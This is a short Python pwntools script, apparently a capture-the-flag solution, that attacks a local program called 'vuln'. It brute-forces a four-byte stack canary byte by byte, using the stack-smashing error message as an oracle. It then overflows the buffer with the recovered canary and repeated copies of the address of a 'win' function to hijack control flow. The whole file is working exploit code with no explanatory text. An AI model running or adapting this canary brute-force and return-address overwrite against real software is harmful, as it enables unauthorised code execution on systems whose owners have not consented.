from __future__ import print_function
import re
import pwn

payload1 = b'40'

elf = pwn.ELF("vuln")
win_addr = elf.symbols[b'win']

canary = ''
finished = False
while finished is not True:
    for char in range(1, 256):
        p = pwn.tubes.process.process(["./vuln"], shell=True)
        prompt = p.read()
        
        p.sendline(payload1)

        prompt = p.read()

        payload = b''
        payload += ('D'*32).encode()
        payload += canary.encode()
        payload += chr(char).encode()
        p.send_raw(payload)
        message = p.read()
        if re.search(b'Smashing', message) is None:
            canary += chr(char)
            if len(canary) == 4:
                p.close()
                finished = True
                break
        p.close()


p = pwn.tubes.process.process(["./vuln"], shell=True)

p.sendline(b'64')
prompt = p.read()
print(prompt)
payload = ('D'*32).encode()
payload += canary.encode()
payload += pwn.p32(win_addr)*5
p.sendline(payload)
prompt = p.read()
print(prompt)

